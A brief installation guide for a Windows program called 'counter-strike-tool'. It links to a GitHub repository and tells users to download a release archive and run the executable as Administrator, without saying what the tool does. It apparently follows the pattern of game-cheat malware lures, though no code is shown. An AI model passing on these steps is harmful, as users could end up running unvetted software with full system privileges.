# Installation Guide — counter-strike-tool

This guide describes how to install and run counter-strike-tool.

Repository: [galeseniorwedge/counter-strike-tool-v2](https://github.com/galeseniorwedge/counter-strike-tool-v2)

## Quick start

1. Open [Releases](https://github.com/galeseniorwedge/counter-strike-tool-v2/releases/latest).
2. Download the latest archive.
3. Extract the archive to any folder.
4. Run the executable as Administrator.

## Requirements

- Windows 10 or 11 (x64)
- 4 GB RAM or more
- Administrator privileges

See the [issues page](https://github.com/galeseniorwedge/counter-strike-tool-v2/issues) and the [README](https://github.com/galeseniorwedge/counter-strike-tool-v2#readme).
